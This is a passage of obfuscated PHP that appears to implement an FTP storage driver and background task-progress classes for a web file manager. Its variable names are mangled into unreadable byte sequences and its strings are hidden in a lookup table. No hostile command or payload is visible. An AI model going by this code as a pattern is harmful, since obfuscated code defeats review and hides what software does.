$·ñ«ö•Ï[8]; check_abort(); $à¡Ã‚è‰ = @ftp_rawlist($this->connect, $õØÄºÇœ); if (!$à¡Ã‚è‰) { $à¡Ã‚è‰ = array(); } $ÄºÑ­¦ø = array($·ñ«ö•Ï[10] => 1, $·ñ«ö•Ï[1375] => 1); foreach ($à¡Ã‚è‰ as $Ğ¹ØÜªÂ) { $ÉÓà™Á‹ = $this->_listItem($Ğ¹ØÜªÂ); if ($ÉÓà™Á‹[0] == $·ñ«ö•Ï[832]) { continue; } $è´Ç®¿— = $ÉÓà™Á‹[8]; if (empty($è´Ç®¿—) && $è´Ç®¿— !== $·ñ«ö•Ï[231] || isset($ÄºÑ­¦ø[$è´Ç®¿—])) { continue; } $è´Ç®¿— = $this->iconvApp($õØÄºÇœ . ltrim($è´Ç®¿—, $·ñ«ö•Ï[8])); $ˆŞú‚Ñ = array($·ñ«ö•Ï[32] => $è´Ç®¿—, $·ñ«ö•Ï[33] => $·ñ«ö•Ï[233], $·ñ«ö•Ï[79] => $ÉÓà™Á‹[4]); if (substr($Ğ¹ØÜªÂ, 0, 1) == $·ñ«ö•Ï[1471]) { $ˆŞú‚Ñ[$·ñ«ö•Ï[33]] = $·ñ«ö•Ï[78]; $ˆŞú‚Ñ[$·ñ«ö•Ï[79]] = 0; } $öÏæüŸ¶ = $ˆŞú‚Ñ[$·ñ«ö•Ï[33]] == $·ñ«ö•Ï[78] ? !0 : !1; $this->cacheMethodInfoSet($è´Ç®¿—, $öÏæüŸ¶, $ˆŞú‚Ñ); if ($öÏæüŸ¶) { $à©¤ú­´[] = $è´Ç®¿—; if ($ ¯ˆ‹Äô) { $this->fileList($è´Ç®¿—, $à©¤ú­´, $æ¤î‹í¬, $ ¯ˆ‹Äô); } continue; } $æ¤î‹í¬[] = $ˆŞú‚Ñ; } $this->cacheMethodInfoSet($õØÄºÇœ, !0); } private function _listItem($è’Ç¤Êó) { if (empty($è’Ç¤Êó)) { return array(); } $íÚ’„÷¼ = preg_split($_SERVER[¼¥ÊĞÙÌ][1472], $è’Ç¤Êó); if (count($íÚ’„÷¼) <= 9) { return $íÚ’„÷¼; } $íÚ’„÷¼[8] = trim(substr($è’Ç¤Êó, strpos($è’Ç¤Êó, $íÚ’„÷¼[7]) + strlen($íÚ’„÷¼[7]))); return array_splice($íÚ’„÷¼, 0, 9); } public function listPath($ŠÑ¸†ãÆ, $Ü‡ÁÀ€­ = false) { $£áÏˆŞ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->_isconn()) { return !1; } $—İÒò£’ = $ë¤ËÖÇù = array(); $this->fileList($ŠÑ¸†ãÆ, $—İÒò£’, $ë¤ËÖÇù); foreach ($—İÒò£’ as $µ…×°ö => $ö¾™ˆ—”) { $—İÒò£’[$µ…×°ö] = $this->folderInfo($ö¾™ˆ—”, $Ü‡ÁÀ€­); } foreach ($ë¤ËÖÇù as $µ…×°ö => $ö¾™ˆ—”) { $ë¤ËÖÇù[$µ…×°ö] = $this->fileInfo($ö¾™ˆ—”[$£áÏˆŞ[32]], $Ü‡ÁÀ€­, $ö¾™ˆ—”); } return array($£áÏˆŞ[85] => $—İÒò£’, $£áÏˆŞ[86] => $ë¤ËÖÇù); } public function has($¶ÀÌ¨ïÖ, $Ç°êßõŞ = false, $ÎªÄ…÷À = true) { $äÔ”ğö‘ =& $_SERVER[¼¥ÊĞÙÌ]; $¼É½¯Î³ = $¤Â‰Ïö = array(); $ÊæßÑƒ = $Ç°êßõŞ ? !0 : !1; $this->fileList($¶ÀÌ¨ïÖ, $¼É½¯Î³, $¤Â‰Ïö, $ÊæßÑƒ); if ($Ç°êßõŞ) { return array($äÔ”ğö‘[242] => count($¤Â‰Ïö), $äÔ”ğö‘[243] => count($¼É½¯Î³)); } if ($ÎªÄ…÷À) { if (count($¤Â‰Ïö)) { return !0; } } else { if (count($¼É½¯Î³)) { return !0; } } return !1; } public function listAll($öÅ—ƒßĞ) { $™Í”ÜğÔ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->_isconn()) { return !1; } $Ú¾»İšÏ = $Ê©”‚í’ = array(); $this->fileList($öÅ—ƒßĞ, $Ú¾»İšÏ, $Ê©”‚í’, !0); $ï®Äà¶ = array_to_keyvalue($Ê©”‚í’, $™Í”ÜğÔ[32]); foreach ($Ú¾»İšÏ as $Ë˜„Ë÷’) { if (is_string($Ë˜„Ë÷’)) { $ï®Äà¶[$Ë˜„Ë÷’] = array($™Í”ÜğÔ[79] => 0); } } return $this->listAllFiles($öÅ—ƒßĞ, $ï®Äà¶); } public function getContent($¸¦ÇÎ³) { if (!$this->_isconn()) { return !1; } $¸¦ÇÎ³ = $this->iconvSystem($¸¦ÇÎ³); return $this->fileSubstr($¸¦ÇÎ³); } public function setContent($äÌ ©ü, $”Û´äÃ = '') { if (!$this->_isconn()) { return !1; } $åÔİ‚ˆò = $this->pathThis($this->iconvSystem($äÌ ©ü)); $„°§–Ö” = $this->tempFile($åÔİ‚ˆò); file_put_contents($„°§–Ö”, $”Û´äÃ); $Âšµ…ê = $this->upload($äÌ ©ü, $this->iconvApp($„°§–Ö”)); $this->tempFileRemve($„°§–Ö”); return $Âšµ…ê; } public function fileSubstr($­á£ÂÊ, $ÏÑü‰ØÌ = 0, $æ‰²œî = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($­á£ÂÊ, $ÏÑü‰ØÌ, $æ‰²œî); } private function ftpRequest($ò»³ÍÚ, $øàÈÂîƒ = 0, $Ù‰Û€ş‡ = false) { $ÑãÔ¹…ï =& $_SERVER[¼¥ÊĞÙÌ]; $ò»³ÍÚ = $ÑãÔ¹…ï[8] . ltrim(str_ltrim($ò»³ÍÚ, $this->ftpPath), $ÑãÔ¹…ï[8]); $ò»³ÍÚ = $this->iconvSystem($ò»³ÍÚ); $ªËŞ¦êë = $this->scheme . $this->host . $ÑãÔ¹…ï[4] . $this->port; $¿ÊÈ™à‹ = curl_init(); curl_setopt($¿ÊÈ™à‹, CURLOPT_URL, $ªËŞ¦êë . $this->pathEncode($ò»³ÍÚ)); curl_setopt($¿ÊÈ™à‹, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($Ù‰Û€ş‡) { $ÊùÙéïÎ = $øàÈÂîƒ + $Ù‰Û€ş‡ - 1; curl_setopt($¿ÊÈ™à‹, CURLOPT_RANGE, "{$øàÈÂîƒ}\x2d{$ÊùÙéïÎ}"); } curl_setopt($¿ÊÈ™à‹, CURLOPT_RETURNTRANSFER, 1); $úˆêÁˆ¦ = curl_exec($¿ÊÈ™à‹); curl_close($¿ÊÈ™à‹); return $úˆêÁˆ¦; } public function upload($å•ïÛ²½, $½Ì­Óä¤, $û¡±ò«ä = false, $™¾£‚õŞ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($å•ïÛ²½))) { return !1; } $å•ïÛ²½ = $this->iconvSystem($å•ïÛ²½); $½Ì­Óä¤ = $this->iconvSystem($½Ì­Óä¤); $òÖâœ‹Ø = ftp_nb_put($this->connect, $å•ïÛ²½, $½Ì­Óä¤, FTP_BINARY); while ($òÖâœ‹Ø == FTP_MOREDATA) { $òÖâœ‹Ø = ftp_nb_continue($this->connect); } if ($òÖâœ‹Ø != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } return $this->getPathOuter($å•ïÛ²½); } public function download($ÇãÈ¤º, $±„ïÖÈÁ = '') { if (!$this->_isconn()) { return !1; } $Ğ”õÔ¹· = $this->pathFather($±„ïÖÈÁ); if (!IO::mkdir($Ğ”õÔ¹·)) { return !1; } $ÇãÈ¤º = $this->iconvSystem($ÇãÈ¤º); $±„ïÖÈÁ = $this->iconvSystem($±„ïÖÈÁ); $¤›¯·¡ = ftp_nb_get($this->connect, $±„ïÖÈÁ, $ÇãÈ¤º, FTP_BINARY); while ($¤›¯·¡ == FTP_MOREDATA) { $¤›¯·¡ = ftp_nb_continue($this->connect); } if ($¤›¯·¡ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[¼¥ÊĞÙÌ][1470], !0); return !1; } return $this->iconvApp($±„ïÖÈÁ); } public function exist($›Ê¦è˜Æ) { return $this->isFile($›Ê¦è˜Æ) || $this->isFolder($›Ê¦è˜Æ); } public function isFile($“€Ê‡·í) { return !$this->isFolder($“€Ê‡·í) && $this->objectMeta($“€Ê‡·í); } public function isFolder($™Êé›ıæ) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][180], $™Êé›ıæ); } protected function objectMeta($¼‰ÁíâÜ) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][182], $¼‰ÁíâÜ); } protected function _objectMeta($¨¤€å¥Ê) { $€±î°‹ =& $_SERVER[¼¥ÊĞÙÌ]; if ($¨¤€å¥Ê == $€±î°‹[12] || $¨¤€å¥Ê == $€±î°‹[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¨¤€å¥Ê = $this->iconvSystem($¨¤€å¥Ê); $¬˜„»æ = array($€±î°‹[32] => $this->iconvApp($¨¤€å¥Ê), $€±î°‹[33] => $€±î°‹[233], $€±î°‹[79] => 0); $ãˆåşå = @ftp_size($this->connect, $¨¤€å¥Ê); if ($ãˆåşå != -1) { $¬˜„»æ[$€±î°‹[79]] = $ãˆåşå; } else { $³á›Œ³ = @ftp_chdir($this->connect, $¨¤€å¥Ê); if (!$³á›Œ³) { return !1; } @ftp_chdir($this->connect, $€±î°‹[8]); $¬˜„»æ[$€±î°‹[33]] = $€±î°‹[78]; } return $¬˜„»æ; } protected function _isFolder($«¿¡¼ª¾) { $ìËÏ¸Œ” =& $_SERVER[¼¥ÊĞÙÌ]; if ($«¿¡¼ª¾ == $ìËÏ¸Œ”[12] || $«¿¡¼ª¾ == $ìËÏ¸Œ”[8]) { return !0; } $Ù€ÎÕ‡ = $this->_objectMeta($«¿¡¼ª¾); return isset($Ù€ÎÕ‡[$ìËÏ¸Œ”[33]]) && $Ù€ÎÕ‡[$ìËÏ¸Œ”[33]] == $ìËÏ¸Œ”[78] ? !0 : !1; } } goto eéö„„º¹º; fŸÁ‘ÃìÀ: class Task { const STATYS_STOP = "\163\164\157\160"; const STATYS_RUNNING = "\x72\165\156\x6e\x69\156\147"; const STATYS_KILL = "\x6b\x69\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($İ³œ²óß, $ê¼‰ŸÃ¡ = '', $ëİ‚™à× = 0, $åñÍº’ = '') { $’Ê˜ë ø =& $_SERVER[¼¥ÊĞÙÌ]; if (self::get($İ³œ²óß)) { return; } $this->task = array($’Ê˜ë ø[478] => $İ³œ²óß, $’Ê˜ë ø[1790] => USER_ID, $’Ê˜ë ø[1678] => $åñÍº’, $’Ê˜ë ø[529] => $’Ê˜ë ø[12], $’Ê˜ë ø[33] => $ê¼‰ŸÃ¡, $’Ê˜ë ø[1152] => $’Ê˜ë ø[12], $’Ê˜ë ø[1150] => $ëİ‚™à×, $’Ê˜ë ø[1791] => 0, $’Ê˜ë ø[1792] => 0, $’Ê˜ë ø[1793] => 0, $’Ê˜ë ø[1794] => timeFloat(), $’Ê˜ë ø[1795] => 0, $’Ê˜ë ø[1796] => 0, $’Ê˜ë ø[1797] => 0, $’Ê˜ë ø[1798] => 0, $’Ê˜ë ø[824] => $’Ê˜ë ø[1739]); $GLOBALS[$’Ê˜ë ø[1799]] = 1; Hook::bind($’Ê˜ë ø[1743], array($this, $’Ê˜ë ø[1800])); Hook::bind($’Ê˜ë ø[1801], array($this, $’Ê˜ë ø[1802])); $this->startAfter(); Hook::trigger($’Ê˜ë ø[1803], $this->task); $this->task[$’Ê˜ë ø[1796]] = timeFloat(); } public function end($‹ú€‹ì¦ = '') { $ùøÊãÈ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ùøÊãÈ[1796]]) { self::valueSet($this->task[$ùøÊãÈ[478]], !1); } $this->isEnd = !0; if ($‹ú€‹ì¦) { $this->task[$ùøÊãÈ[529]] = $‹ú€‹ì¦; } self::log($ùøÊãÈ[1804] . $this->task[$ùøÊãÈ[478]] . $ùøÊãÈ[1805] . sprintf($ùøÊãÈ[931], timeFloat() - $this->task[$ùøÊãÈ[1794]]) . $ùøÊãÈ[1806]); Hook::unbind($ùøÊãÈ[1743], array($this, $ùøÊãÈ[1800])); Hook::unbind($ùøÊãÈ[1801], array($this, $ùøÊãÈ[1802])); $this->endAfter(); $Æ¨§³×Ñ = $this->task; $this->task = !1; Hook::trigger($ùøÊãÈ[1807], $Æ¨§³×Ñ); } public function update($§¥õ‹üé = 0, $³Û­Ò™¿ = false) { $€ÛåïíÜ =& $_SERVER[¼¥ÊĞÙÌ]; $ø°Ù«¶§ =& $this->task; if (!$ø°Ù«¶§) { return; } $ø°Ù«¶§[$€ÛåïíÜ[1791]] += $§¥õ‹üé; $ø°Ù«¶§[$€ÛåïíÜ[1795]] = timeFloat(); if ($ø°Ù«¶§[$€ÛåïíÜ[1150]]) { if ($ø°Ù«¶§[$€ÛåïíÜ[1150]] < $ø°Ù«¶§[$€ÛåïíÜ[1791]]) { $ø°Ù«¶§[$€ÛåïíÜ[1150]] = $ø°Ù«¶§[$€ÛåïíÜ[1791]]; } $©Îò“Û½ = timeFloat() - $ø°Ù«¶§[$€ÛåïíÜ[1794]] - $ø°Ù«¶§[$€ÛåïíÜ[1797]]; if ($©Îò“Û½ <= 0) { $©Îò“Û½ = 0.001; } $ø°Ù«¶§[$€ÛåïíÜ[1792]] = $ø°Ù«¶§[$€ÛåïíÜ[1791]] / $ø°Ù«¶§[$€ÛåïíÜ[1150]]; $ø°Ù«¶§[$€ÛåïíÜ[1793]] = $ø°Ù«¶§[$€ÛåïíÜ[1791]] / $©Îò“Û½; if ($ø°Ù«¶§[$€ÛåïíÜ[1792]] > 0) { $ø°Ù«¶§[$€ÛåïíÜ[1798]] = $©Îò“Û½ * (1 - $ø°Ù«¶§[$€ÛåïíÜ[1792]]) / $ø°Ù«¶§[$€ÛåïíÜ[1792]]; } $ø°Ù«¶§[$€ÛåïíÜ[1798]] = $ø°Ù«¶§[$€ÛåïíÜ[1798]] <= 0 ? 0 : $ø°Ù«¶§[$€ÛåïíÜ[1798]]; } $this->updateAfter(); $±êÈªìº = 0.2; if (timeFloat() - $ø°Ù«¶§[$€ÛåïíÜ[1796]] < $±êÈªìº && !$³Û­Ò™¿) { return; } $„¶Ü˜ï· = self::get($ø°Ù«¶§[$€ÛåïíÜ[478]]); $…Ì¾¹¢¨ = $„¶Ü˜ï·[$€ÛåïíÜ[824]]; if ($…Ì¾¹¢¨ == self::STATYS_KILL) { $ë§ßîÃÉ = array($€ÛåïíÜ[1808] => LNG($€ÛåïíÜ[1809]), $€ÛåïíÜ[1309] => !1); Cache::set($€ÛåïíÜ[1810] . $this->task[$€ÛåïíÜ[478]], $ë§ßîÃÉ, 30); $this->onKill(); $this->end(); die; } else { if ($…Ì¾¹¢¨ == self::STATYS_STOP) { $ÚúµóÁÌ = 2; $„¶Ü˜ï·[$€ÛåïíÜ[1797]] += $ÚúµóÁÌ; self::valueSet($ø°Ù«¶§[$€ÛåïíÜ[478]], $„¶Ü˜ï·); sleep($ÚúµóÁÌ); $this->update(); return; } } $ø°Ù«¶§[$€ÛåïíÜ[824]] = $…Ì¾¹¢¨ ? $…Ì¾¹¢¨ : $ø°Ù«¶§[$€ÛåïíÜ[824]]; $ø°Ù«¶§[$€ÛåïíÜ[1797]] = $„¶Ü˜ï·[$€ÛåïíÜ[1797]] ? $„¶Ü˜ï·[$€ÛåïíÜ[1797]] : 0; $ø°Ù«¶§[$€ÛåïíÜ[1796]] = timeFloat(); Hook::trigger($€ÛåïíÜ[1811], $ø°Ù«¶§); self::valueSet($ø°Ù«¶§[$€ÛåïíÜ[478]], $ø°Ù«¶§); } public function onKillSet($ÖÛƒ¶­œ, $ËÁ´­ê = array()) { $this->onKillCall = array($ÖÛƒ¶­œ, $ËÁ´­ê); } public function onKill() { $Âø“–Æ =& $_SERVER[¼¥ÊĞÙÌ]; self::log($Âø“–Æ[1804] . $this->task[$Âø“–Æ[478]] . $Âø“–Æ[1812]); Hook::trigger($Âø“–Æ[1813], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($éÁÆ³ò„) { $£å”Å« =& $_SERVER[¼¥ÊĞÙÌ]; Cache::set($£å”Å«[1810] . $this->task[$£å”Å«[478]], $éÁÆ³ò„, 60); if (!is_array($éÁÆ³ò„) || !$éÁÆ³ò„[$£å”Å«[1309]]) { self::log($£å”Å«[1814] . json_encode($éÁÆ³ò„)); } return $éÁÆ³ò„; } public static function get($ÓÄÎ²¶ª) { $‘ÜğúÚğ =& $_SERVER[¼¥ÊĞÙÌ]; $´š´«ƒ = self::valueGet($ÓÄÎ²¶ª); if (is_array($´š´«ƒ) && $´š´«ƒ[$‘ÜğúÚğ[1815]]) { $¶²–ªªª = ActionApply($´š´«ƒ[$‘ÜğúÚğ[1815]], array($´š´«ƒ)); $´š´«ƒ = is_array($¶²–ªªª) ? $¶²–ªªª : $´š´«ƒ; } return $´š´«ƒ; } public static function listData() { $´ˆ¬‚ùÆ = self::valueGet(); return array_sort_by($´ˆ¬‚ùÆ, $_SERVER[¼¥ÊĞÙÌ][1794], !0); } public static function kill($­¼×Á««) { return self::changeStatus($­¼×Á««, self::STATYS_KILL); } public static function stop($”ÛÀôè) { return self::changeStatus($”ÛÀôè, self::STATYS_STOP); } public static function restart($Î¬¤ºëä) { return self::changeStatus($Î¬¤ºëä, self::STATYS_RUNNING); } public static function killAll() { $È¸ß²ÜÑ =& $_SERVER[¼¥ÊĞÙÌ]; $¬¶¡ÃÖ· = self::listData(); foreach ($¬¶¡ÃÖ· as $¥”Üß«¡) { self::kill($¥”Üß«¡[$È¸ß²ÜÑ[478]]); } sleep(2); foreach ($¬¶¡ÃÖ· as $¥”Üß«¡) { self::valueSet($¥”Üß«¡[$È¸ß²ÜÑ[478]], !1); } } private static function changeStatus($Ÿ®«¯†, $†ÓÖÌÏ‡) { $£íÙ¿¯ =& $_SERVER[¼¥ÊĞÙÌ]; $Šå´ëà = self::valueGet($Ÿ®«¯†); if (!$Šå´ëà) { return !1; } $Šå´ëà[$£íÙ¿¯[824]] = $†ÓÖÌÏ‡; self::valueSet($Ÿ®«¯†, $Šå´ëà); self::log($£íÙ¿¯[1816] . $Šå´ëà[$£íÙ¿¯[478]] . $£íÙ¿¯[1817] . $†ÓÖÌÏ‡); return !0; } public static function valueGet($èœ…ÏÜÂ = false) { $‘˜á‡åÈ =& $_SERVER[¼¥ÊĞÙÌ]; if ($èœ…ÏÜÂ) { $ö‚Ê§“Ï = Model($‘˜á‡åÈ[523])->where(array($‘˜á‡åÈ[97] => $èœ…ÏÜÂ, $‘˜á‡åÈ[33] => $‘˜á‡åÈ[1159]))->find(); return $ö‚Ê§“Ï ? json_decode($ö‚Ê§“Ï[$‘˜á‡åÈ[453]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ã­ßÚ£ë = false) { $Ê«ü¥²¨ =& $_SERVER[¼¥ÊĞÙÌ]; $Ğƒ½Ÿ©ı = array($Ê«ü¥²¨[33] => $Ê«ü¥²¨[1159]); if ($Ã­ßÚ£ë) { $Ğƒ½Ÿ©ı[$Ê«ü¥²¨[1790]] = $Ã­ßÚ£ë; } $«×ë•‰Ì = Model($Ê«ü¥²¨[523])->where($Ğƒ½Ÿ©ı)->select(); $«×ë•‰Ì = $«×ë•‰Ì ? $«×ë•‰Ì : array(); foreach ($«×ë•‰Ì as $ãéğÓŠ => $Ú¢ªÁ) { $«×ë•‰Ì[$ãéğÓŠ] = json_decode($Ú¢ªÁ[$Ê«ü¥²¨[453]], !0); } return $«×ë•‰Ì; } public static function valueSet($Ø±ÓììÆ, $³®İî°Ì) { $€ÛÌ‹ÔÛ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$³®İî°Ì) { return Model($€ÛÌ‹ÔÛ[523])->where(array($€ÛÌ‹ÔÛ[97] => $Ø±ÓììÆ, $€ÛÌ‹ÔÛ[33] => $€ÛÌ‹ÔÛ[1159]))->delete(); } $ç“Ñ•åø = json_encode($³®İî°Ì); if (!$ç“Ñ•åø) { ob_start(); var_dump($³®İî°Ì); $¹òöûû² = ob_get_clean(); self::log($€ÛÌ‹ÔÛ[1818] . json_encode_force($¹òöûû²)); } if (!$Ø±ÓììÆ || !$³®İî°Ì[$€ÛÌ‹ÔÛ[478]]) { return !1; } $ Æ˜–Êõ = array($€ÛÌ‹ÔÛ[33] => $€ÛÌ‹ÔÛ[1159], $€ÛÌ‹ÔÛ[1790] => USER_ID, $€ÛÌ‹ÔÛ[97] => $Ø±ÓììÆ, $€ÛÌ‹ÔÛ[453] => $ç“Ñ•åø); $©ö€¶íô = $€ÛÌ‹ÔÛ[1819]; CacheLock::lock($©ö€¶íô); Model($€ÛÌ‹ÔÛ[523])->add($ Æ˜–Êõ, array(), !0); CacheLock::unlock($©ö€¶íô); } public static function log($ß´›î‘Ç) { if (!GLOBAL_DEBUG) { return; } write_log($ß´›î‘Ç, $_SERVER[¼¥ÊĞÙÌ][1820]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ÕÁ°ŒÑ  =& $_SERVER[¼¥ÊĞÙÌ]; $•ÙÖÒÂ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ÕÁ°ŒÑ [1821], array($this, $ÕÁ°ŒÑ [1822])); Hook::bind($ÕÁ°ŒÑ [1320], array($this, $ÕÁ°ŒÑ [1823])); Hook::bind($ÕÁ°ŒÑ [1824], array($this, $ÕÁ°ŒÑ [1825])); Hook::bind($ÕÁ°ŒÑ [676], array($this, $ÕÁ°ŒÑ [1826])); Hook::bind($ÕÁ°ŒÑ [677], array($this, $ÕÁ°ŒÑ [1827])); Hook::bind($ÕÁ°ŒÑ [683], array($this, $ÕÁ°ŒÑ [1828])); Hook::bind($ÕÁ°ŒÑ [684], array($this, $ÕÁ°ŒÑ [1829])); Hook::bind($ÕÁ°ŒÑ [679], array($this, $ÕÁ°ŒÑ [1830])); Hook::bind($ÕÁ°ŒÑ [681], array($this, $ÕÁ°ŒÑ [1831])); Hook::bind($ÕÁ°ŒÑ [645], array($this, $ÕÁ°ŒÑ [1832])); Hook::bind($ÕÁ°ŒÑ [642], array($this, $ÕÁ°ŒÑ [1832])); Hook::bind($ÕÁ°ŒÑ [647], array($this, $ÕÁ°ŒÑ [1832])); Hook::bind($ÕÁ°ŒÑ [649], array($this, $ÕÁ°ŒÑ [1832])); Hook::bind($ÕÁ°ŒÑ [651], array($this, $ÕÁ°ŒÑ [1832])); Hook::bind($ÕÁ°ŒÑ [1833], array($this, $ÕÁ°ŒÑ [1834])); Hook::bind($ÕÁ°ŒÑ [667], array($this, $ÕÁ°ŒÑ [1835])); $this->sourceModelCopyFlag = !1; Hook::bind($ÕÁ°ŒÑ [1836], array($this, $ÕÁ°ŒÑ [1837])); Hook::bind($ÕÁ°ŒÑ [1838], array($this, $ÕÁ°ŒÑ [1839])); Hook::bind($ÕÁ°ŒÑ [1840], array($this, $ÕÁ°ŒÑ [1841])); $•ÙÖÒÂ[$ÕÁ°ŒÑ [1842]] = LNG($ÕÁ°ŒÑ [1843]); $•ÙÖÒÂ[$ÕÁ°ŒÑ [1844]] = 0; $•ÙÖÒÂ[$ÕÁ°ŒÑ [1845]] = 0; $•ÙÖÒÂ[$ÕÁ°ŒÑ [1152]] = $ÕÁ°ŒÑ [12]; $•ÙÖÒÂ[$ÕÁ°ŒÑ [1846]] = $ÕÁ°ŒÑ [12]; $•ÙÖÒÂ[$ÕÁ°ŒÑ [1847]] = 0; $•ÙÖÒÂ[$ÕÁ°ŒÑ [1848]] = 0; $•ÙÖÒÂ[$ÕÁ°ŒÑ [1849]] = 0; if (!$•ÙÖÒÂ[$ÕÁ°ŒÑ [1678]]) { $•ÙÖÒÂ[$ÕÁ°ŒÑ [1678]] = LNG($ÕÁ°ŒÑ [1850]); } } protected function endAfter() { $ °Á¨¬ =& $_SERVER[¼¥ÊĞÙÌ]; Hook::unbind($ °Á¨¬[1821], array($this, $ °Á¨¬[1822])); Hook::unbind($ °Á¨¬[1320], array($this, $ °Á¨¬[1823])); Hook::unbind($ °Á¨¬[1824], array($this, $ °Á¨¬[1825])); Hook::unbind($ °Á¨¬[676], array($this, $ °Á¨¬[1826])); Hook::unbind($ °Á¨¬[677], array($this, $ °Á¨¬[1827])); Hook::unbind($ °Á¨¬[683], array($this, $ °Á¨¬[1828])); Hook::unbind($ °Á¨¬[684], array($this, $ °Á¨¬[1829])); Hook::unbind($ °Á¨¬[679], array($this, $ °Á¨¬[1830])); Hook::unbind($ °Á¨¬[681], array($this, $ °Á¨¬[1831])); Hook::unbind($ °Á¨¬[645], array($this, $ °Á¨¬[1832])); Hook::unbind($ °Á¨¬[642], array($this, $ °Á¨¬[1832])); Hook::unbind($ °Á¨¬[647], array($this, $ °Á¨¬[1832])); Hook::unbind($ °Á¨¬[649], array($this, $ °Á¨¬[1832])); Hook::unbind($ °Á¨¬[651], array($this, $ °Á¨¬[1832])); Hook::unbind($ °Á¨¬[1833], array($this, $ °Á¨¬[1834])); Hook::unbind($ °Á¨¬[667], array($this, $ °Á¨¬[1835])); Hook::unbind($ °Á¨¬[1836], array($this, $ °Á¨¬[1837])); Hook::unbind($ °Á¨¬[1838], array($this, $ °Á¨¬[1839])); Hook::unbind($ °Á¨¬[1840], array($this, $ °Á¨¬[1841])); } public function copyMoveStart($ö†•Ùú, $¯«úÀ¢», $é­ûèî, $ÌÈÜ•ø) { $¯×œ“¤ø =& $_SERVER[¼¥ÊĞÙÌ]; self::log($¯×œ“¤ø[1851] . $¯«úÀ¢» . $¯×œ“¤ø[73] . $ÌÈÜ•ø); $ËõÂ‘Ì¼ = rtrim(TEMP_FILES, $¯×œ“¤ø[8]); if (substr($¯«úÀ¢», 0, strlen($ËõÂ‘Ì¼)) == $ËõÂ‘Ì¼) { return; } if (substr($ÌÈÜ•ø, 0, strlen($ËõÂ‘Ì¼)) == $ËõÂ‘Ì¼) { return; } $ìğûéŸ =& $this->task; $ìğûéŸ[$¯×œ“¤ø[1852]] = KodIO::transferType($ö†•Ùú, $é­ûèî); $this->update(); } public function updateAfter() { $î’®åœ =& $_SERVER[¼¥ÊĞÙÌ]; $œäƒÁ =& $this->task; if (!$œäƒÁ[$î’®åœ[837]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($œäƒÁ[$î’®åœ[1852]] == $î’®åœ[1421]) { return; } self::updateTask($œäƒÁ); } private static function updateTask(&$¼¡øè¦¹) { $Ä™ˆÏà‰ =& $_SERVER[¼¥ÊĞÙÌ]; if ($¼¡øè¦¹[$Ä™ˆÏà‰[1852]] == $Ä™ˆÏà‰[1291] || $¼¡øè¦¹[$Ä™ˆÏà‰[1852]] == $Ä™ˆÏà‰[110]) { if ($¼¡øè¦¹[$Ä™ˆÏà‰[1846]]) { $¼¡øè¦¹[$Ä™ˆÏà‰[1849]] = $¼¡øè¦¹[$Ä™ˆÏà‰[1848]] + $¼¡øè¦¹[$Ä™ˆÏà‰[1845]]; } } else { if ($¼¡øè¦¹[$Ä™ˆÏà‰[1852]] == $Ä™ˆÏà‰[1422]) { if ($¼¡øè¦¹[$Ä™ˆÏà‰[1846]] == $Ä™ˆÏà‰[1291]) { $¼¡øè¦¹[$Ä™ˆÏà‰[1849]] = $¼¡øè¦¹[$Ä™ˆÏà‰[1848]] + $¼¡øè¦¹[$Ä™ˆÏà‰[1845]] * 0.5; } else { if ($¼¡øè¦¹[$Ä™ˆÏà‰[1846]] == $Ä™ˆÏà‰[110]) { $¼¡øè¦¹[$Ä™ˆÏà‰[1849]] = $¼¡øè¦¹[$Ä™ˆÏà‰[1848]] + $¼¡øè¦¹[$Ä™ˆÏà‰[1844]] * 0.5 + $¼¡øè¦¹[$Ä™ˆÏà‰[1845]] * 0.5; } } } } $¼¡øè¦¹[$Ä™ˆÏà‰[1792]] = $¼¡øè¦¹[$Ä™ˆÏà‰[1849]] / $¼¡øè¦¹[$Ä™ˆÏà‰[837]]; if ($¼¡øè¦¹[$Ä™ˆÏà‰[1792]] > 0) { $Õ¶ºÕ˜ü = timeFloat() - $¼¡øè¦¹[$Ä™ˆÏà‰[1794]] - $¼¡øè¦¹[$Ä™ˆÏà‰[1797]]; $¼¡øè¦¹[$Ä™ˆÏà‰[1798]] = $Õ¶ºÕ˜ü * (1 - $¼¡øè¦¹[$Ä™ˆÏà‰[1792]]) / $¼¡øè¦¹[$Ä™ˆÏà‰[1792]]; } } public function addPath($‡ÇË§Ş) { $Õèâ¬™å =& $_SERVER[¼¥ÊĞÙÌ]; if (!$‡ÇË§Ş) { return; } $ÄüºÚãı =& $this->task; $–äèõ÷Õ = IO::infoWithChildren($‡ÇË§Ş); $ÖØî…±ß = $ÄüºÚãı[$Õèâ¬™å[1853]] ? $ÄüºÚãı[$Õèâ¬™å[1853]][$Õèâ¬™å[1854]] : 0; $ÄüºÚãı[$Õèâ¬™å[1853]] = array($Õèâ¬™å[1854] => $ÖØî…±ß + 1, $Õèâ¬™å[497] => $–äèõ÷Õ[$Õèâ¬™å[32]], $Õèâ¬™å[87] => $–äèõ÷Õ[$Õèâ¬™å[87]], $Õèâ¬™å[587] => $–äèõ÷Õ[$Õèâ¬™å[587]] ? $–äèõ÷Õ[$Õèâ¬™å[587]] : $–äèõ÷Õ[$Õèâ¬™å[87]]); if 